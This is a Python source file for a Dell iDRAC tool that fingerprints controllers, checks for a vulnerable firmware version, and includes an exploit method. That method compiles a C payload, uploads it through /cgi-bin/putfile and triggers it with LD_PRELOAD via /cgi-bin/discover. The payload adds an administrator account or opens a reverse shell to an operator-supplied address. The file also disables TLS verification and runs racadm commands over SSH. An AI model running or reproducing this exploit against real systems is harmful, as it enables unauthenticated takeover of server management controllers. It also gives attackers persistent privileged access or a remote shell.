import httpx
import warnings
import json
import os
import re
import struct
import ssl
import uuid
import asyncio
import shutil
from typing import Dict, Optional, Union, List
import socket
import random
import string
import secrets
import paramiko
import time

# Disable SSL warnings for httpx
warnings.filterwarnings("ignore")

# SSL context configuration
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE
ssl_context.set_ciphers("ALL:@SECLEVEL=0")
ssl_context.minimum_version = ssl.TLSVersion.TLSv1

# Some iDRAC/WAF configurations reject the default httpx User-Agent with a
# 403, which previously left metadata requests empty.
DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ),
}


class iDRAC:
    def __init__(self, ip: str, port: int = 443):
        self.ip = ip
        self.port = port
        self.username = None
        self.password = None
        self.base_url = f"https://{ip}:{port}"
        self.payloadScripts = os.path.join(os.path.dirname(__file__), "payloads")
        self.client = None  # Initialize as None

    async def __aenter__(self):
        """Async context manager entry"""
        await self._ensure_client()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.client:
            await self.client.aclose()

    async def _ensure_client(self):
        """Ensure httpx client is initialized"""
        if not self.client:
            self.client = httpx.AsyncClient(
                verify=ssl_context,
                timeout=30.0,
                headers=DEFAULT_HEADERS,
            )

    async def _fetchURL(self, endpoint: str, data: Union[bytes, Dict] = None):
        await self._ensure_client()

        if data:
            return await self.client.post(url=f"{self.base_url}{endpoint}", data=data)
        else:
            # Follow redirects for metadata GETs, but leave POST uploads alone.
            return await self.client.get(
                url=f"{self.base_url}{endpoint}", follow_redirects=True
            )

    async def _fetchURLSafe(self, endpoint: str):
        """Fetch an endpoint without letting transport errors abort the caller."""
        try:
            return await self._fetchURL(endpoint)
        except Exception:
            return None

    @staticmethod
    def _deepFind(data, key: str) -> Optional[str]:
        """Case-insensitive recursive lookup of a scalar value in parsed JSON."""
        if isinstance(data, dict):
            for name, value in data.items():
                if name.lower() == key.lower() and isinstance(value, (str, int, float)):
                    return str(value)
            for value in data.values():
                found = iDRAC._deepFind(value, key)
                if found is not None:
                    return found
        elif isinstance(data, list):
            for item in data:
                found = iDRAC._deepFind(item, key)
                if found is not None:
                    return found
        return None

    @staticmethod
    def _findValue(text: str, key: str) -> Optional[str]:
        """Read a value from a JSON (or JSON-like/JS) response body."""
        try:
            parsed = json.loads(text)
        except Exception:
            parsed = None

        if isinstance(parsed, (dict, list)):
            value = iDRAC._deepFind(parsed, key)
            if value is not None:
                return value

        match = re.search(
            r'"%s"\s*:\s*"((?:\\.|[^"\\])*)"' % re.escape(key), text, re.I
        )
        if match:
            try:
                return json.loads('"%s"' % match.group(1))
            except Exception:
                return match.group(1)
        return None

    @staticmethod
    def _tagValue(text: str, tag: str) -> Optional[str]:
        """Read a value from a simple XML/XML-like response body."""
        match = re.search(
            r"<%s>\s*(.*?)\s*</%s>" % (re.escape(tag), re.escape(tag)),
            text,
            re.I | re.S,
        )
        if not match:
            return None
        value = match.group(1).strip()
        return value or None

    @staticmethod
    def _normalizeModelName(value: str) -> Optional[str]:
        if not value:
            return None
        match = re.search(r"iDRAC\s*(\d+)", value, re.I)
        if not match:
            match = re.search(r"Remote Access Controller\s*(\d+)", value, re.I)
        if match:
            return "iDRAC" + match.group(1)
        return None

    @staticmethod
    def _modelFromSystemModel(value: str) -> Optional[str]:
        """Map a PowerEdge model name to its iDRAC generation.

        The second digit of the model number encodes the server generation
        (e.g. R620 -> 12G/iDRAC7, R230 -> 13G/iDRAC8, R740 -> 14G/iDRAC9).
        """
        if not value:
            return None
        match = re.search(
            r"PowerEdge\s+[A-Za-z]+\s*(\d)\s*[A-Za-z-]*\s*(\d)", value, re.I
        )
        if not match:
            return None
        try:
            generation = int(match.group(2))
        except ValueError:
            return None
        if generation == 1:
            return "iDRAC6"
        if generation == 2:
            return "iDRAC7"
        if generation == 3:
            return "iDRAC8"
        if generation >= 4:
            return "iDRAC9"
        return None

    @staticmethod
    def _idracFromServerGen(value: str) -> Optional[str]:
        """Map a server-generation string (e.g. '16G') to its iDRAC model.

        Used by the legacy /data?get=prodServerGen endpoint (iDRAC6/7/8) and
        by /sysmgmt/2015/bmc/info Attributes.ServerGen on iDRAC9.
        """
        if not value:
            return None
        generation = value.lower()
        if "11g" in generation:
            return "iDRAC6"
        if "12g" in generation:
            return "iDRAC7"
        if "13g" in generation:
            return "iDRAC8"
        if any(gen in generation for gen in ("14g", "15g", "16g")):
            return "iDRAC9"
        return None

    async def getInfo(self):
        result = {
            "ip": self.ip,
            "port": self.port,
            "hostname": None,
            "systemModel": None,
            "idracModel": None,
            "license": None,
            "fwVersion": None,
            "serviceTag": None,
            "error": None,
            "success": True,
        }

        # Number of endpoints that answered successfully. Used only to decide
        # whether we actually talked to an iDRAC or to something random.
        responses = 0

        # --- Login page -----------------------------------------------------
        # iDRAC6 exposes hostname/license in the page itself; the same page is
        # also a useful generation hint for older controllers.
        rLogin = await self._fetchURLSafe("/login.html")
        if rLogin is not None and rLogin.status_code == 200:
            responses += 1
            loginText = rLogin.text or ""
            loginLower = loginText.lower()

            if "idrac6" in loginLower and "idrac7" not in loginLower:
                result["idracModel"] = "iDRAC6"

            hostnameMatch = re.search(
                r"tmphostname\s*=\s*[\"']([^\"']*)[\"']", loginText, re.I
            )
            if hostnameMatch and hostnameMatch.group(1).strip():
                result["hostname"] = hostnameMatch.group(1).strip()

            licenseMatch = re.search(
                r"Integrated Dell Remote Access Controller 6\s*-\s*([^<\r\n]+)",
                loginText,
                re.I,
            )
            if licenseMatch and licenseMatch.group(1).strip():
                result["license"] = licenseMatch.group(1).strip()
                if not result["idracModel"]:
                    result["idracModel"] = "iDRAC6"

        # --- Discovery endpoint (iDRAC model) -------------------------------
        rDiscover = await self._fetchURLSafe("/cgi-bin/discover")
        if rDiscover is not None and rDiscover.status_code == 200:
            responses += 1
            endpointType = self._tagValue(rDiscover.text or "", "ENDPOINTTYPE")
            model = self._normalizeModelName(endpointType or "")
            if model:
                result["idracModel"] = model

        # --- Legacy /data endpoints (iDRAC6/7/8) ----------------------------
        rServerGen = await self._fetchURLSafe("/data?get=prodServerGen")
        if rServerGen is not None and rServerGen.status_code == 200:
            responses += 1
            serverGen = self._tagValue(rServerGen.text or "", "prodServerGen")
            if serverGen:
                mapped = self._idracFromServerGen(serverGen)
                if mapped:
                    result["idracModel"] = mapped

        rClassName = await self._fetchURLSafe("/data?get=prodClassName")
        if rClassName is not None and rClassName.status_code == 200:
            responses += 1
            licenseValue = self._tagValue(rClassName.text or "", "prodClassName")
            if licenseValue and any(
                word in licenseValue.lower()
                for word in (
                    "basic",
                    "express",
                    "enterprise",
                    "datacenter",
                    "evaluation",
                )
            ):
                result["license"] = licenseValue

        # iDRAC6 exposes host/model/firmware under different /data keys.
        rLegacyData = await self._fetchURLSafe("/data?get=sysDesc,hostName,fwVersion")
        if rLegacyData is not None and rLegacyData.status_code == 200:
            responses += 1
            legacyText = rLegacyData.text or ""
            legacySysDesc = self._tagValue(legacyText, "sysDesc")
            legacyHost = self._tagValue(legacyText, "hostName")
            legacyFw = self._tagValue(legacyText, "fwVersion")
            if legacySysDesc and not result["systemModel"]:
                result["systemModel"] = legacySysDesc
            if legacyHost and not result["hostname"]:
                result["hostname"] = legacyHost
            if legacyFw and not result["fwVersion"]:
                result["fwVersion"] = legacyFw

        # --- Session properties (works on iDRAC6/7/8/9) ----------------------
        # This is the authoritative source for hostname/firmware/model and was
        # previously only queried when /data?get=prodServerGen returned 200.
        rSession = await self._fetchURLSafe(
            "/session?aimGetProp=hostname,gui_str_title_bar,OEMHostName,fwVersion,sysDesc"
        )
        if rSession is not None and rSession.status_code == 200:
            responses += 1
            sessionText = rSession.text or ""
            sessionHostname = self._findValue(
                sessionText, "hostname"
            ) or self._findValue(sessionText, "OEMHostName")
            sessionFwVersion = self._findValue(sessionText, "fwVersion")
            sessionSysDesc = self._findValue(sessionText, "sysDesc")

            if sessionHostname:
                result["hostname"] = sessionHostname
            if sessionFwVersion:
                result["fwVersion"] = sessionFwVersion
            if sessionSysDesc:
                result["systemModel"] = sessionSysDesc

        # Fallback to single-property queries if the combined request was
        # rejected or returned only part of the data.
        if not result["fwVersion"]:
            for prop in ("fwVersion", "fwVersionFull"):
                rFw = await self._fetchURLSafe(f"/session?aimGetProp={prop}")
                if rFw is not None and rFw.status_code == 200:
                    responses += 1
                    fwValue = self._findValue(rFw.text or "", prop)
                    if fwValue:
                        result["fwVersion"] = fwValue
                        break

        if not result["hostname"]:
            rHost = await self._fetchURLSafe("/session?aimGetProp=hostname")
            if rHost is not None and rHost.status_code == 200:
                responses += 1
                hostValue = self._findValue(rHost.text or "", "hostname")
                if hostValue:
                    result["hostname"] = hostValue

        if not result["systemModel"]:
            rSysDesc = await self._fetchURLSafe("/session?aimGetProp=sysDesc")
            if rSysDesc is not None and rSysDesc.status_code == 200:
                responses += 1
                sysDescValue = self._findValue(rSysDesc.text or "", "sysDesc")
                if sysDescValue:
                    result["systemModel"] = sysDescValue

        # --- iDRAC9 metadata endpoint ---------------------------------------
        # iDRAC9 (fw >= 4.x/5.x) removed the legacy /session and /data APIs, so
        # this unauthenticated endpoint is the main metadata source.  Key names
        # differ from the older firmware: hostname is "iDRACName"/"GUITitleBar",
        # the license is "License" (not "LicenseType"), and the server
        # generation ("ServerGen", e.g. "16G") identifies the iDRAC model.
        rBmcInfo = await self._fetchURLSafe("/sysmgmt/2015/bmc/info")
        if rBmcInfo is not None and rBmcInfo.status_code == 200:
            responses += 1
            bmcText = rBmcInfo.text or ""
            bmcFw = self._findValue(bmcText, "FwVer") or self._tagValue(
                bmcText, "FwVer"
            )
            bmcModel = self._findValue(bmcText, "SystemModelName") or self._tagValue(
                bmcText, "SystemModelName"
            )
            bmcHost = (
                self._findValue(bmcText, "iDRACName")
                or self._findValue(bmcText, "GUITitleBar")
                or self._findValue(bmcText, "HostName")
                or self._tagValue(bmcText, "iDRACName")
                or self._tagValue(bmcText, "HostName")
            )
            bmcLicense = (
                self._findValue(bmcText, "License")
                or self._findValue(bmcText, "LicenseType")
                or self._tagValue(bmcText, "License")
                or self._tagValue(bmcText, "LicenseType")
            )
            bmcServerGen = self._findValue(bmcText, "ServerGen")
            bmcServiceTag = (
                self._findValue(bmcText, "ServiceTag")
                or self._findValue(bmcText, "ServiceIdentification")
            )

            if bmcFw and not result["fwVersion"]:
                result["fwVersion"] = bmcFw
            if bmcModel and not result["systemModel"]:
                result["systemModel"] = bmcModel
            if bmcHost and not result["hostname"]:
                result["hostname"] = bmcHost
            if bmcLicense and not result["license"]:
                result["license"] = bmcLicense
            if bmcServiceTag and not result["serviceTag"]:
                result["serviceTag"] = bmcServiceTag
            if not result["idracModel"]:
                mapped = self._idracFromServerGen(bmcServerGen or "")
                if mapped:
                    result["idracModel"] = mapped

        # --- iDRAC9 locale file (generation hint) ----------------------------
        rLocale = await self._fetchURLSafe("/restgui/locale/strings/locale_str_en.json")
        if rLocale is not None and rLocale.status_code == 200:
            responses += 1
            try:
                localeData = json.loads(rLocale.text or "{}")
                localeTitle = localeData.get("app_title") or ""
                localeModel = self._normalizeModelName(localeTitle)
                if localeModel:
                    result["idracModel"] = localeModel
            except Exception:
                pass

        # --- Redfish service root (unauthenticated fallback) -----------------
        rRedfish = await self._fetchURLSafe("/redfish/v1")
        if rRedfish is not None and rRedfish.status_code == 200:
            responses += 1
            redfishText = rRedfish.text or ""
            # iDRAC9 service roots expose the iDRAC firmware as
            # "ManagerServicesFirmwareVersion" (newer builds) or
            # "FirmwareVersion"; older/other BMCs may expose neither.
            redfishFw = (
                self._findValue(redfishText, "FirmwareVersion")
                or self._findValue(redfishText, "ManagerServicesFirmwareVersion")
            )
            redfishProduct = self._findValue(redfishText, "Product") or self._findValue(
                redfishText, "ManagerModel"
            )
            redfishServiceTag = (
                self._findValue(redfishText, "ServiceTag")
                or self._findValue(redfishText, "ServiceIdentification")
            )
            if redfishFw and not result["fwVersion"]:
                result["fwVersion"] = redfishFw
            if redfishServiceTag and not result["serviceTag"]:
                result["serviceTag"] = redfishServiceTag
            redfishModel = self._normalizeModelName(redfishProduct or "")
            if redfishModel and not result["idracModel"]:
                result["idracModel"] = redfishModel

        # --- Redfish manager resource (authenticated iDRAC9 firmware) --------
        # /redfish/v1/Managers/1 carries the authoritative iDRAC firmware
        # version but requires credentials; only query it when the caller has
        # configured a username/password on this instance.
        if self.username and self.password and not result["fwVersion"]:
            try:
                import base64

                await self._ensure_client()
                credentials = base64.b64encode(
                    f"{self.username}:{self.password}".encode()
                ).decode()
                rMgr = await self.client.get(
                    f"{self.base_url}/redfish/v1/Managers/1",
                    headers={**DEFAULT_HEADERS, "Authorization": f"Basic {credentials}"},
                    follow_redirects=True,
                )
                if rMgr is not None and rMgr.status_code == 200:
                    responses += 1
                    mgrText = rMgr.text or ""
                    mgrFw = self._findValue(mgrText, "FirmwareVersion")
                    mgrModel = self._findValue(mgrText, "Model") or self._findValue(
                        mgrText, "ManagerModel"
                    )
                    if mgrFw and not result["fwVersion"]:
                        result["fwVersion"] = mgrFw
                    mgrNorm = self._normalizeModelName(mgrModel or "")
                    if mgrNorm and not result["idracModel"]:
                        result["idracModel"] = mgrNorm
            except Exception:
                pass

        # --- Infer the generation from the PowerEdge model name --------------
        if not result["idracModel"] and result["systemModel"]:
            result["idracModel"] = self._modelFromSystemModel(result["systemModel"])

        # --- Derive the generation from the firmware if not already known ----
        if not result["idracModel"] and result["fwVersion"]:
            try:
                major = int(result["fwVersion"].split(".")[0])
                # iDRAC9 ships 3.x-7.x; iDRAC10 uses 1.x, so only >=3 is safe.
                if major >= 3:
                    result["idracModel"] = "iDRAC9"
            except (TypeError, ValueError):
                pass

        if responses == 0:
            result["success"] = False
            result["error"] = "No iDRAC information endpoints responded"
        elif not any(
            result[key]
            for key in (
                "hostname",
                "systemModel",
                "idracModel",
                "fwVersion",
                "license",
                "serviceTag",
            )
        ):
            result["success"] = False
            result["error"] = "iDRAC responded but no properties could be parsed"

        return result

    async def checkIfVulnerable(self):
        result = {"vulnerable": False, "error": None, "success": True}

        fwVulnerable = False
        ldDebugVulnerable = False

        # Firmware check
        try:
            rSession = await self._fetchURL("/session?aimGetProp=fwVersion")
            if rSession and rSession.status_code == 200:
                fwVersion = json.loads(rSession.text)["aimGetProp"].get("fwVersion", "")

                parts = fwVersion.split(".")
                if len(parts) >= 2:
                    major = int(parts[0])
                    minor = int(parts[1])
                    fwVulnerable = (major < 2) or (major == 2 and minor < 52)
        except Exception as e:
            result["success"] = False
            result["error"] = str(e)
            return result

        if fwVulnerable:
            try:
                rLDDebug = await self._fetchURL("/cgi-bin/login?LD_DEBUG=files")

                if rLDDebug and rLDDebug.text:
                    ldDebugVulnerable = r"calling init: /lib/" in rLDDebug.text

            except Exception as e:
                result["success"] = False
                result["error"] = str(e)
                return result

        result["vulnerable"] = fwVulnerable and ldDebugVulnerable
        return result

    async def exploit(
        self,
        payload_type: str = "adduser",
        username: str = "root",
        password: str = "calvin",
        privilege: str = "0x000001ff",
        reverse_ip: str = None,
        reverse_port: int = None,
    ):
        """
        Execute exploit with selected payload

        Args:
            payload_type: Type of payload to use ("adduser", "reverseshell" or "quickpayload")
            username: Username for adduser payload
            password: Password for adduser payload
            privilege: Privilege level for adduser payload
            reverse_ip: IP for reverse shell callback
            reverse_port: Port for reverse shell callback
        """

        result = {
            "payload_type": payload_type,
            "credentials": {
                "username": username,
                "password": password,
            },
            "reverse_shell": {"ip": reverse_ip, "port": reverse_port},
            "privilege": privilege,
            "success": True,
            "error": None,
        }

        # Validate payload type
        availableTypes = [
            os.path.splitext(f)[0]
            for f in os.listdir(self.payloadScripts)
            if f.endswith(".c") and os.path.isfile(os.path.join(self.payloadScripts, f))
        ]
        if payload_type not in availableTypes:
            result["success"] = False
            result["error"] = f"Invalid payload type. Available types: {availableTypes}"
            return result

        workFolder = f"work_{str(uuid.uuid4())[:8]}"
        os.makedirs(workFolder, exist_ok=True)

        try:
            # Load and prepare the payload
            CPayloadFile = os.path.join(self.payloadScripts, f"{payload_type}.c")

            if not os.path.exists(CPayloadFile):
                result["success"] = False
                result["error"] = f"Payload file not found: {CPayloadFile}"
                return result

            with open(CPayloadFile, "r", encoding="utf-8") as f:
                CPayload = f.read()

            # Replace variables based on payload type
            if payload_type in ("adduser", "adduser_enterprise", "quickpayload"):
                CPayload = CPayload.replace("{username}", username)
                CPayload = CPayload.replace("{password}", password)
                CPayload = CPayload.replace("{privilege}", privilege)
            elif payload_type in ("reverseshell"):
                CPayload = CPayload.replace("{ip}", reverse_ip)
                CPayload = CPayload.replace("{port}", str(reverse_port))

            # Save payload to work folder
            payload_c_path = os.path.join(workFolder, "payload.c")
            with open(payload_c_path, "w", encoding="utf-8") as f:
                f.write(CPayload)

            # Compile payload
            print(f"Compiling {payload_type} payload...")
            compileStatus = os.system(
                f'sh4-linux-gcc -shared -fPIC {payload_c_path} -o {os.path.join(workFolder, "payload.so")}'
            )
            if compileStatus != 0:
                result["error"] = "Compilation failed (SH4 cross-compiler required)"
                result["success"] = False
                print("Compilation failed")
                return result
            print("Compilation successful")

            # Read compiled payload
            print("Uploading payload...")
            with open(os.path.join(workFolder, "payload.so"), "rb") as f:
                payload_so = f.read()

            # Prepare upload data
            FFLAGS = 1
            FAlias = b"RACPKSSHAUTHKEY1"
            payload = FAlias + (32 - len(FAlias)) * b"\0"
            payload += struct.pack("<L", len(payload_so))
            payload += struct.pack("<L", FFLAGS)
            payload += payload_so

            # Upload payload
            rUpload = await self._fetchURL("/cgi-bin/putfile", data=payload)
            if rUpload and rUpload.status_code == 200:
                print("Payload uploaded successfully")
            else:
                print("Payload upload failed")
                result["error"] = "Error uploading payload, maybe a timeout issue."
                result["success"] = False
                return result

            # Trigger payload
            print("Triggering payload...")
            rTrigger = await self._fetchURL(
                "/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp"
            )
            if rTrigger and rTrigger.status_code == 200:
                print("Payload triggered successfully")

                # Add success messages based on payload type
                if payload_type == "adduser":
                    print(f"✓ User added successfully")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                elif payload_type == "reverseshell":
                    print(f"✓ Reverse shell payload executed")
                    print(f"  Connecting to {reverse_ip}:{reverse_port}")
                    print("  Make sure you have a listener ready!")

            else:
                print("Payload trigger failed")
                result["error"] = "Error triggering the payload, maybe a timeout issue."
                result["success"] = False
                return result

            return result

        except Exception as e:
            result["success"] = False
            result["error"] = str(e)
            print(f"Error during exploit: {e}")
            return result

        finally:
            # Clean up work folder
            if os.path.exists(workFolder):
                try:
                    shutil.rmtree(workFolder)
                    print(f"Cleaned up work folder: {workFolder}")
                except Exception as e:
                    print(f"Warning: Could not clean up work folder {workFolder}: {e}")

    async def getInventory(self, username=None, password=None) -> Dict:
        """
        Get BIOS inventory by SSHing into the iDRAC, executing racadm commands,
        waiting for completion, and returning raw logs.
        """

        username = self.username if username is None else username
        password = self.password if password is None else password

        commands = [
            "racadm get BIOS.SysInformation",
            "racadm get BIOS.ProcSettings",
            "racadm get BIOS.MemSettings",
            "racadm get BIOS.SysProfileSettings",
            "racadm get BIOS.IntegratedDevices",
            "racadm get BIOS.SlotDisablement",
            "racadm get BIOS.SlotBifurcation",
            "racadm get BIOS.SataSettings",
            "racadm get BIOS.SysSecurity",
            "racadm get BIOS.TpmAdvanced",
            "racadm get BIOS.MiscSettings",
        ]

        result = {"success": False, "error": None, "raw_logs": ""}

        client = None
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            print(f"SSH connecting to {self.ip}...")
            client.connect(
                hostname=self.ip,
                port=22,
                username=username,
                password=password,
                timeout=30,
                allow_agent=False,
                look_for_keys=False,
            )

            # Get shell channel
            shell = client.invoke_shell()
            time.sleep(3)

            # Clear any initial output
            while shell.recv_ready():
                shell.recv(1024)

            # Execute all commands
            all_output = ""
            for cmd in commands:
                print(f"Executing: {cmd}")
                shell.send(f"{cmd}\n")
                time.sleep(0.25)

            # Wait for all commands to finish
            print("Waiting for commands to complete...")
            last_data_time = time.time()
            idle_timeout = 10  # seconds

            while True:
                if shell.recv_ready():
                    output = shell.recv(4096).decode("utf-8", errors="ignore")
                    all_output += output
                    last_data_time = time.time()
                    print(f"Received {len(output)} bytes")
                elif shell.exit_status_ready():
                    break

                # Check if idle for too long
                if time.time() - last_data_time > idle_timeout:
                    print(f"No data for {idle_timeout} seconds, assuming completion")
                    break

                time.sleep(0.5)

            # Get any remaining output
            while shell.recv_ready():
                output = shell.recv(4096).decode("utf-8", errors="ignore")
                all_output += output

            result["raw_logs"] = all_output
            result["success"] = True

        except Exception as e:
            result["error"] = f"SSH error: {str(e)}"
            print(f"Error: {str(e)}")
        finally:
            if client:
                client.close()
                print("SSH connection closed")

        return result
